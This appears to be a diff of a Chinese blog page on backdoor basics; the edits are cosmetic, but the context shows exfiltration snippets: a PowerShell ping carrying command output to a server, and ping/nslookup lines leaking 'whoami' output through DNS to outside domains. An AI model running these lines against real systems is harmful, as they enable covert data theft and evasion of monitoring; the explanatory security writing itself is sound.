@@ -111,7 +111,7 @@
 没有最好的后门，只有最合适的后门。
 
 在整体架构上，一个优秀的后门应该充分考虑其功能、触发方式和通信方式等方面。针对不同的方面，杀软也会根据其特征进行处理。为了进一步的持续性控制以及后渗透，后门越显复杂化。从后门的发展史中可看出，这是一场攻与防的持续性较量，简单来说，渗透测试拿下服务器后，怎么能不留后门呢。当然，这是玩笑话。">
-<meta property="og:updated_time" content="2017-03-14T14:30:04.206Z">
+<meta property="og:updated_time" content="2017-03-14T14:35:41.669Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Backdoor 基础学习">
 <meta name="twitter:description" content="概述
@@ -484,12 +484,12 @@
 <h2 id="icmp型"><a href="#icmp型" class="headerlink" title="icmp型"></a>icmp型</h2><p>ICMP通信协议中可看到在最后空余了很大的data段，名为数据缓冲区，可填充60000多字节。因此，可将被控端得到的数据放入其中：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$cmd</span> = ls;</div><div class="line"><span class="variable">$timeout</span> = 1000;</div><div class="line"><span class="variable">$server_ip</span> = <span class="string">'xxxx'</span>;</div><div class="line">(New-Object System.Net.NetworkInformation.Ping).Send(<span class="variable">$server_ip</span>, <span class="variable">$timeout</span>, <span class="variable">$cmd</span>)</div></pre></td></tr></table></figure>
 <p>在server_ip上抓包可看到返回结果。</p>
-<h2 id="dns型"><a href="#dns型" class="headerlink" title="dns型"></a>dns型</h2><p>DNS原理在这不过多展开，这种类型的逃逸方法一般是用自己申请的域名，将NS记录指向搭建的NS服务器上，使用DNS泛解析，把用户所查询关于该域名的信息记录下来。<br>复制代码</p>
+<h2 id="dns型"><a href="#dns型" class="headerlink" title="dns型"></a>dns型</h2><p>DNS原理在这不过多展开，这种类型的逃逸方法一般是用自己申请的域名，将NS记录指向搭建的NS服务器上，使用DNS泛解析，把用户所查询关于该域名的信息记录下来。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ping -c 2 `whoami`.xxxx.ceye.io</div></pre></td></tr></table></figure>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ nslookup -querytype=txt <span class="variable">$data</span>.ns.lynahex.com 8.8.8.8</div></pre></td></tr></table></figure>
 <p>不过使用如上的常规方法，似乎会对data长度有限制。<br>自建NS服务器的源码可看NoEye（题外话：有的厂商从数据库中查询指定域名的txt记录时并未过滤，可能会有sql注入。:-D。）</p>
 <p>该类流行的木马可参考dnscat2,它涉及了更底层的包构造，即使没有域名，也可使用该协议进行通信。</p>
-<p>具体<a href="http://bl4ck.in/index.php/penetration/use-dns-to-bypass-firewall.html" target="_blank" rel="external">用法</a></p>
+<p><a href="http://bl4ck.in/index.php/penetration/use-dns-to-bypass-firewall.html" target="_blank" rel="external">具体用法</a></p>
 <p>总的来说，这类后门依赖于上层协议，符合人们常用协议的范围，同时，攻击者也在探寻新兴的协议来exfiltrate。</p>
 <h1 id="网站类"><a href="#网站类" class="headerlink" title="网站类"></a>网站类</h1><p>传统的后门中自然少不了该类型，从用户发出数据请求开始到最终落入网站的数据库中，经过服务端的每一环节都有可能成为攻击者利用的地方。</p>
 <h2 id="模块扩展型"><a href="#模块扩展型" class="headerlink" title="模块扩展型"></a>模块扩展型</h2><p>中间件之所以能被利用，是因为它们的可扩展性，当布置完模块或插件时，中间件无法判断开发者的行为是否为恶意。</p>
@@ -664,7 +664,7 @@
             
             
             <div class="site-state-item site-state-tags">
-              <a href="/tags/index-1.html">
+              <a href="/tags/index.html">
                 <span class="site-state-item-count">28</span>
                 <span class="site-state-item-name">标签</span>
               </a>
